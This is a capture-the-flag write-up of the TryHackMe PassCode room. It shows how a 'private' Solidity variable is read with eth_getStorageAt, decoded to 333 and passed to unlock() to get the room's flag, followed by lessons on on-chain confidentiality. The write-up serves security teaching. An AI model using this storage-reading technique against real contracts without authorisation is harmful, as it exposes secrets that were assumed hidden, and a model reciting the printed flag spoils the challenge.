# TryHackMe — PassCode

## 1. Challenge Overview

**Room:** PassCode
**Platform:** TryHackMe
**Category:** Web3 / Blockchain / Smart Contract Security
**Difficulty:** Easy
**Objective:** Make the smart contract's `isSolved()` function return `true` and retrieve the flag.

### Target Information

| Item             | Value                                        |
| ---------------- | -------------------------------------------- |
| Lab IP           | `10.49.143.25`                               |
| RPC URL          | `http://10.49.143.25:8545`                   |
| Chain ID         | `31337`                                      |
| Contract Address | `0xf22cB0Ca047e88AC996c17683Cee290518093574` |
| Player Address   | `0x27531c2f67f40cF1cF4FfDD21BA925ec6CB0Fb43` |

> **Note:** The private key provided by the challenge is intentionally omitted from this report.

---

# 2. Challenge Scenario

The challenge describes an attempt to break into the DarkInject blockchain by exploiting a vulnerability in its system.

The objective given by the room was:

```text
have the isSolved() function return true
```

The challenge provided a deployed Ethereum smart contract, a player wallet, and an RPC endpoint.

---

# 3. Initial Reconnaissance

The challenge API was queried to retrieve the blockchain information:

```bash
export RPC_URL=http://10.49.143.25:8545
export API_URL=http://10.49.143.25

curl -s "$API_URL/challenge" | jq
```

The response contained the player wallet and deployed contract information.

The important values were extracted:

```bash
export PRIVATE_KEY=$(curl -s "$API_URL/challenge" | jq -r ".player_wallet.private_key")
export PLAYER_ADDRESS=$(curl -s "$API_URL/challenge" | jq -r ".player_wallet.address")
export CONTRACT_ADDRESS=$(curl -s "$API_URL/challenge" | jq -r ".contract_address")
```

The initial state of the contract was checked using:

```text
isSolved() = false
```

Therefore, the contract had not yet been solved.

---

# 4. Smart Contract Analysis

The Solidity source code was available through the challenge webpage.

The relevant contract was:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Challenge {
    string private secret = "THM{}";
    bool private unlock_flag = false;
    uint256 private code;
    string private hint_text;
    
    constructor(
        string memory flag,
        string memory challenge_hint,
        uint256 challenge_code
    ) {
        secret = flag;
        code = challenge_code;
        hint_text = challenge_hint;
    }
    
    function hint() external view returns (string memory) {
        return hint_text;
    }
    
    function unlock(uint256 input) external returns (bool) {
        if (input == code) {
            unlock_flag = true;
            return true;
        }
        return false;
    }
    
    function isSolved() external view returns (bool) {
        return unlock_flag;
    }
    
    function getFlag() external view returns (string memory) {
        require(unlock_flag, "Challenge not solved yet");
        return secret;
    }
}
```

---

# 5. Identifying the Vulnerable Logic

The most important function was:

```solidity
function unlock(uint256 input) external returns (bool) {
    if (input == code) {
        unlock_flag = true;
        return true;
    }
    return false;
}
```

The contract requires the caller to provide the correct value of:

```solidity
code
```

If the correct value is provided:

```text
input == code
```

then:

```solidity
unlock_flag = true;
```

The `isSolved()` function simply returns this variable:

```solidity
function isSolved() external view returns (bool) {
    return unlock_flag;
}
```

Therefore, the exploitation objective became:

```text
Recover code
      ↓
Call unlock(code)
      ↓
unlock_flag = true
      ↓
isSolved() = true
```

---

# 6. Storage Layout Analysis

The state variables were declared in this order:

```solidity
string private secret;
bool private unlock_flag;
uint256 private code;
string private hint_text;
```

The `code` variable was therefore investigated at storage slot `2`.

The important security observation was that the variable was declared:

```solidity
uint256 private code;
```

However, Solidity's `private` modifier does **not** encrypt or hide blockchain storage.

The value can still be inspected through an Ethereum node's JSON-RPC interface.

---

# 7. Reading the Private Storage Variable

The Ethereum JSON-RPC method:

```text
eth_getStorageAt
```

was used to inspect storage slot `2`.

Command:

```bash
curl -s -X POST "$RPC_URL" \
  -H "Content-Type: application/json" \
  --data '{
    "jsonrpc":"2.0",
    "method":"eth_getStorageAt",
    "params":["'"$CONTRACT_ADDRESS"'","0x2","latest"],
    "id":1
  }' | jq
```

The response was:

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": "0x000000000000000000000000000000000000000000000000000000000000014d"
}
```

The relevant value was:

```text
0x14d
```

---

# 8. Decode the Recovered Value

The hexadecimal value was converted to decimal:

```bash
python3 -c "print(int('0x14d', 16))"
```

Result:

```text
333
```

Therefore:

```text
code = 333
```

---

# 9. Exploitation

The vulnerable contract function required:

```solidity
unlock(333)
```

Since `cast` was not available on the AttackBox, the transaction was performed using Python and `web3.py`.

The transaction called:

```text
unlock(333)
```

using the challenge-provided player wallet.

The transaction completed successfully with:

```text
Transaction status: 1
```

This caused the contract state to change:

```solidity
unlock_flag = true;
```

---

# 10. Verify the Contract State

After the transaction, `isSolved()` was called again.

The result was:

```text
isSolved = True
```

This confirmed that the exploitation was successful.

The state transition was:

```text
Before exploitation:

unlock_flag = false
isSolved()   = false


After exploitation:

unlock_flag = true
isSolved()   = true
```

---

# 11. Retrieve the Flag

Once the contract was unlocked, the `getFlag()` function could be called:

```solidity
function getFlag() external view returns (string memory) {
    require(unlock_flag, "Challenge not solved yet");
    return secret;
}
```

The returned flag was:

```text
THM{web3_h4ck1ng_code}
```

---

# 12. Exploitation Chain

The complete attack chain was:

```text
                    Smart Contract
                          |
                          v
                 Analyze unlock()
                          |
                          v
                 Identify `code`
                          |
                          v
              `code` is private
                          |
                          v
            Analyze storage layout
                          |
                          v
                 Storage slot 2
                          |
                          v
             eth_getStorageAt()
                          |
                          v
                      0x14d
                          |
                          v
                       333
                          |
                          v
                  unlock(333)
                          |
                          v
                unlock_flag = true
                          |
                          v
                  isSolved() = true
                          |
                          v
                    getFlag()
                          |
                          v
             THM{web3_h4ck1ng_code}
```

---

# 13. Root Cause

The root cause was the assumption that a Solidity `private` variable is secret.

The contract stored the unlock code directly on-chain:

```solidity
uint256 private code;
```

Although Solidity prevents direct access to the variable from other contracts, the underlying storage remains observable through blockchain infrastructure.

An attacker with access to the RPC endpoint could inspect the contract's storage and recover the value.

---

# 14. Key Learning Points

## Solidity `private` Does Not Mean Secret

A declaration such as:

```solidity
uint256 private code;
```

does not provide confidentiality.

Blockchain storage should be considered publicly observable.

---

## Contract Storage Can Reveal Sensitive Data

Ethereum nodes expose storage through JSON-RPC methods such as:

```text
eth_getStorageAt
```

If sensitive information is stored directly in contract storage, it may be recoverable.

---

## `view` Functions vs. Transactions

The following function:

```solidity
isSolved()
```

only reads contract state and does not require a transaction.

The following function:

```solidity
unlock(333)
```

modifies contract state and therefore requires a signed transaction.

---

## State-Based Challenge Logic

The challenge was solved by identifying the state variable controlling:

```text
isSolved()
```

and finding the function that modifies it.

The important relationship was:

```text
code → unlock() → unlock_flag → isSolved()
```

---

# 15. Final Result

### Initial State

```text
isSolved() = false
```

### Recovered Code

```text
0x14d = 333
```

### Exploit

```text
unlock(333)
```

### Final State

```text
isSolved() = true
```

### Flag

```text
THM{web3_h4ck1ng_code}
```

---

# 16. Conclusion

The PassCode challenge demonstrated a common Web3 security misconception: **blockchain data cannot be made confidential simply by declaring a Solidity variable `private`.**

By analyzing the smart contract, identifying the storage location of the `code` variable, reading the value directly from blockchain storage, and supplying it to the `unlock()` function, the contract was successfully transitioned into its solved state.

The final flag was:

```text
THM{web3_h4ck1ng_code}
```